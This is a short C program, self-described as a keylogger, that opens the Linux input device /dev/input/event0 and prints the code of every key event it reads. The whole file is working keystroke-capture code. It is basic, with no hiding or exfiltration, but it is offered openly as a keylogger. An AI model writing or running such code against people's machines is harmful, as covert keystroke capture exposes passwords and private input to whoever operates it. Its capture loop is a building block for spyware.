#include <stdio.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <linux/input.h>
#include <unistd.h>


int main(){
    printf("Keylogger active running.....\n");
    int pd;
    struct input_event ev;
    pd = open("/dev/input/event0", O_RDONLY, 0644);
    if(pd == -1){
        printf("Failed to open the ktb file\n");
        perror("/dev/input/event0");
        return 1;
    }
    while (read(pd, &ev, sizeof(ev)) > 0)
    {
       printf("\n %x", ev.code); 
    }

    close(pd);
    return 0;


}